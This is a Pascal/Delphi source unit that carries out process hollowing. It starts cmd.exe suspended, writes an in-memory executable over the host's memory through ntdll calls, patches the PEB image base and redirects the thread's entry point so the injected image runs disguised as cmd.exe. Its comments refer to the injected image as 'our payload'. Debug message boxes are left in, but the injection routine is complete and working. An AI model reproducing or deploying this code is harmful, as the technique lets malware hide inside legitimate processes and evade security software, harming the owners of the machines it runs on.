unit uRun2;

{$IFDEF FPC}
  {$MODE Delphi}
{$ENDIF}

interface

procedure CreateProcessEx(FileMemory: pointer);

type
 TSArray = array of Byte;

implementation

uses
windows,dos,sysutils;

const
STATUS_SUCCESS             = $00000000;  

type
  TSections = array [0..0] of TImageSectionHeader;

  PROCESS_BASIC_INFORMATION = packed record
    ExitStatus: DWORD;
    PebBaseAddress: Pointer;
    AffinityMask: ulong_ptr; //dword;
    BasePriority: DWORD;
    UniqueProcessId: DWORD;
    InheritedUniquePID:DWORD;
  end;

PVOID = pointer;
   PPVOID = ^PVOID;
   NTSTATUS = ULONG;
   HANDLE = THANDLE;

function  NtAllocateVirtualMemory(
      ProcessHandle : HANDLE;
      BaseAddress : PPVOID;
      ZeroBits : ULONG;
      AllocationSize : PULONG;
      AllocationType : ULONG;
      Protect : ULONG
    ): NTSTATUS; stdcall; external 'ntdll.dll';

function  NtWriteVirtualMemory(
      ProcessHandle : HANDLE;
      BaseAddress : PVOID;
      Buffer : PVOID;
      BufferLength : ULONG;
      ReturnLength : PULONG
    ): NTSTATUS; stdcall; external 'ntdll.dll';

function  NtQueryInformationProcess(
  ProcessHandle : THandle;
  ProcessInformationClass : DWORD;
  ProcessInformation : Pointer;
  ProcessInformationLength : ULONG;
  ReturnLength : PULONG
 ): ntstatus; stdcall; external 'ntdll.dll';

function AllocMemAlign(const ASize, AAlign: Cardinal; out AHolder: Pointer): Pointer;
var
  Size: Cardinal;
  Shift: NativeUInt;
begin
  if AAlign <= 1 then
  begin
    AHolder := AllocMem(ASize);
    Result := AHolder;
    Exit;
  end;

  if ASize = 0 then
  begin
    AHolder := nil;
    Result := nil;
    Exit;
  end;

  Size := ASize + AAlign - 1;

  AHolder := AllocMem(Size);

  Shift := NativeUInt(AHolder) mod AAlign;
  if Shift = 0 then
    Result := AHolder
  else
    Result := Pointer(NativeUInt(AHolder) + (AAlign - Shift));
end;

function GetAlignedSize(Size: dword; Alignment: dword): dword;
begin
  if ((Size mod Alignment) = 0) then
  begin
    Result := Size;
  end
  else
  begin
    Result := ((Size div Alignment) + 1) * Alignment;
  end;
end;

function Align(Value, Align: Cardinal): Cardinal;
begin
  if ((Value mod Align) = 0) then
    Result := Value
  else
    Result := ((Value + Align - 1) div Align) * Align;
end;

function ImageSize(Image: pointer): dword;
var
  Alignment: dword;
  ImageNtHeaders: {$IFDEF win32}PIMAGE_NT_HEADERS32;{$endif}{$IFDEF win64}PIMAGE_NT_HEADERS64;{$endif}
  PSections: ^TSections;
  SectionLoop: dword;
begin
  ImageNtHeaders := pointer(dword(dword(Image)) + dword(PImageDosHeader(Image)._lfanew));
  Alignment := ImageNtHeaders.OptionalHeader.SectionAlignment;
  if ((ImageNtHeaders.OptionalHeader.SizeOfHeaders mod Alignment) = 0) then
  begin
    Result := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
  end
  else
  begin
    Result := ((ImageNtHeaders.OptionalHeader.SizeOfHeaders div Alignment) + 1) * Alignment;
  end;
  PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
  for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
  begin
    if PSections[SectionLoop].Misc.VirtualSize <> 0 then
    begin
      if ((PSections[SectionLoop].Misc.VirtualSize mod Alignment) = 0) then
      begin
        Result := Result + PSections[SectionLoop].Misc.VirtualSize;
      end
      else
      begin
        Result := Result + (((PSections[SectionLoop].Misc.VirtualSize div Alignment) + 1) * Alignment);
      end;
    end;
  end;
end;

procedure CreateProcessEx(FileMemory: pointer);
var
  PEBAddress,BaseAddress,  HeaderSize, InjectSize,  SectionLoop, SectionSize: dword;
  BaseAddress64:int64;
  PEBAddress64:dword64;
  //Context: TContext;
  ctx: PContext;
  Storage: Pointer;
  FileData,imagebase: pointer;
  ImageNtHeaders: {$IFDEF win32}PIMAGE_NT_HEADERS32;{$endif}{$IFDEF win64}PIMAGE_NT_HEADERS64;{$endif}
  InjectMemory: pointer;
  ProcInfo: TProcessInformation;
  PSections: ^TSections;
  StartInfo: TStartupInfo;
  Status:integer;
  returnlength:PULONG;
  ProcessBasicInfo     : PROCESS_BASIC_INFORMATION;
  Bytes:ptruint;
begin
  ImageNtHeaders := pointer(ptruint(ptruint(FileMemory)) + ptruint(PImageDosHeader(FileMemory)._lfanew));
  InjectSize := ImageSize(FileMemory);
  GetMem(InjectMemory, InjectSize);
  try
    FileData := InjectMemory;
    HeaderSize := ImageNtHeaders.OptionalHeader.SizeOfHeaders;
    PSections := pointer(pchar(@(ImageNtHeaders.OptionalHeader)) + ImageNtHeaders.FileHeader.SizeOfOptionalHeader);
    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
    begin
      if PSections[SectionLoop].PointerToRawData < HeaderSize then HeaderSize := PSections[SectionLoop].PointerToRawData;
    end;
    CopyMemory(FileData, FileMemory, HeaderSize);
    FileData := pointer(ptruint(FileData) + GetAlignedSize(ImageNtHeaders.OptionalHeader.SizeOfHeaders, ImageNtHeaders.OptionalHeader.SectionAlignment));
    //messagebox(0,pchar('NumberOfSections='+inttostr(ImageNtHeaders.FileHeader.NumberOfSections)),'',0);
    for SectionLoop := 0 to ImageNtHeaders.FileHeader.NumberOfSections - 1 do
    begin
      if PSections[SectionLoop].SizeOfRawData > 0 then
      begin
        SectionSize := PSections[SectionLoop].SizeOfRawData;
        if SectionSize > PSections[SectionLoop].Misc.VirtualSize then SectionSize := PSections[SectionLoop].Misc.VirtualSize;
        CopyMemory(FileData, pointer(ptruint(FileMemory) + PSections[SectionLoop].PointerToRawData), SectionSize);
        FileData := pointer(ptruint(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end
      else
      begin
        if PSections[SectionLoop].Misc.VirtualSize <> 0 then FileData := pointer(ptruint(FileData) + GetAlignedSize(PSections[SectionLoop].Misc.VirtualSize, ImageNtHeaders.OptionalHeader.SectionAlignment));
      end;
    end;

    ZeroMemory(@StartInfo, SizeOf(StartupInfo));
    //ZeroMemory(@Context, SizeOf(TContext));
    {$IFDEF win32}
    //CreateProcess(nil, pchar(extractfilepath(ParamStr(0))+'host32.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    CreateProcess(nil, pchar(GetEnv('systemroot')+'\SysWOW64\cmd.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    {$endif}
    {$IFDEF win64}
    //CreateProcess(nil, pchar(extractfilepath(ParamStr(0))+'host64.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);
    CreateProcess(nil, pchar(GetEnv('systemroot')+'\System32\cmd.exe'), nil, nil, False, CREATE_SUSPENDED, nil, nil, StartInfo, ProcInfo);

    {$endif}
    //
    //Context.ContextFlags := CONTEXT_INTEGER; //CONTEXT_FULL;
    //below is mandatory on x64
    ctx := AllocMemAlign(SizeOf(TContext), 16, Storage);
    ctx^.ContextFlags := CONTEXT_INTEGER;
    if GetThreadContext(ProcInfo.hThread, ctx^)=false
       then raise Exception.Create('GetThreadContext failed'+inttostr(getlasterror));

    {$IFDEF win32}
    PEBAddress:=ctx^.Ebx;
    {$endif}
    {$IFDEF win64}
    PEBAddress64:=ctx^.Rdx;  //rcx=entrypoint
    {$endif}
    //OR
    //COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
    //below works on x32, not on x64
    {if NtQueryInformationProcess(ProcInfo.hProcess, 0, @ProcessBasicInfo, SizeOf(ProcessBasicInfo), returnlength)=status_success
    //if ret=status_success
      then PEBAddress := longint(ProcessBasicInfo.PebBaseAddress)
      else raise Exception.Create ('NtQueryInformationProcess failed,'+inttostr(returnlength^));
      }
    //messagebox(0,pchar('Host PEBAddress='+inttohex(PEBAddress,sizeof(ptruint))),'',0);
    //COMMENT: Reads the BaseAddress of a 32bit Process, which is where the exe data starts
    bytes:=0;
    {$IFDEF win32}
    messagebox(0,pchar('Host PEB='+inttohex(PEBAddress,sizeof(ptruint))),'',0);
    ReadProcessMemory(ProcInfo.hProcess, pointer(PEBAddress + $8), @BaseAddress, sizeof(ptruint), Bytes);
    if bytes=sizeof(ptruint)
       then messagebox(0,pchar('Host BaseAddress='+inttohex(BaseAddress,sizeof(ptruint))),'',0)
       else raise Exception.Create('ReadProcessMemory failed='+inttostr(getlasterror));
    {$endif}
    {$IFDEF win64}
    messagebox(0,pchar('Host PEB='+inttohex(PEBAddress64,sizeof(ptruint))),'',0);
    ReadProcessMemory(ProcInfo.hProcess, pointer(PEBAddress64 + $10), @BaseAddress64, sizeof(ptruint), Bytes);
    if bytes=sizeof(ptruint)
       then messagebox(0,pchar('Host BaseAddress='+inttohex(BaseAddress64,sizeof(ptruint))),'',0)
       else raise Exception.Create('ReadProcessMemory failed='+inttostr(getlasterror));
    {$endif}
    //VirtualAllocEx(ProcInfo.hProcess, pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectSize, MEM_RESERVE or MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    //replace VirtualAllocEx
    InjectSize:=align(InjectSize,$1000);
    imagebase:=pointer(ImageNtHeaders.OptionalHeader.ImageBase);
    messagebox(0,pchar('PE ImageBase='+inttohex(ImageNtHeaders.OptionalHeader.ImageBase,sizeof(ptruint))),'',0);
    messagebox(0,pchar('PE AddressOfEntryPoint='+inttohex(ImageNtHeaders.OptionalHeader.AddressOfEntryPoint ,sizeof(ptruint))),'',0);
    status:=NtAllocateVirtualMemory(ProcInfo.hProcess ,@imagebase,0,@InjectSize,MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if status<>0 then raise Exception.Create ('NtAllocateVirtualMemory failed, '+inttohex(status,sizeof(ptruint)));

    //lets write our imagebase payload at pe.imagebase in our host
    NtWriteVirtualMemory(ProcInfo.hProcess,pointer(ImageNtHeaders.OptionalHeader.ImageBase), InjectMemory, InjectSize,@returnlength);

    //lets modify the ImageBase of our host
    {$IFDEF win32}
    NtWriteVirtualMemory(ProcInfo.hProcess, pointer(PEBAddress + $8), @ImageNtHeaders.OptionalHeader.ImageBase, sizeof(ptruint), @returnlength);
    {$endif}
    {$IFDEF win64}
    NtWriteVirtualMemory(ProcInfo.hProcess, pointer(PEBAddress64 + $10), @ImageNtHeaders.OptionalHeader.ImageBase, sizeof(ptruint), @returnlength);
    {$endif}

    //lets modify the entrypoint of our host
    {$IFDEF win32}
    ctx^.Eax := ImageNtHeaders.OptionalHeader.ImageBase + ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
    {$endif}
    {$IFDEF win64}
    ctx^.Rcx := ImageNtHeaders.OptionalHeader.ImageBase + ImageNtHeaders.OptionalHeader.AddressOfEntryPoint;
    {$endif}
    SetThreadContext(ProcInfo.hThread, ctx^);
    ResumeThread(ProcInfo.hThread);
  finally
    FreeMemory(InjectMemory);
  end;
end;

end.
 
